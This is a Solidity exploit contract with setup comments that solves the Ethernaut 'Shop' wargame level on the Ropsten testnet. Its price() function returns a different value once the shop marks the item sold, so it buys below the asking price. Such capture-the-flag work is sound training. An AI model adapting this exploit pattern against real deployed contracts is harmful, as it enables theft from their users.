/* Tools needed for this level:
- Remix IDE

1.- Copy Ethernaut's Shop contract to Remix. No need to deploy the contract.

2.- Deploy this contract (ShopAttackRopsten) with Remix using injected web3 environment.

3.- Call the attack() function with Remix passing Ethernaut's shop contract address.
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Shop.sol';

contract ShopAttackRopsten {
	function attack(address shopAddr) public {
		Shop(shopAddr).buy();
	}

	function price() public view returns (uint256) {
		bool isSold = Shop(msg.sender).isSold();

		assembly {
			let result
			switch isSold
			case 1 {
				result := 0
			}
			default {
				result := 100
			}
			mstore(0x0, result)
			return(0x0, 32)
		}
	}
}
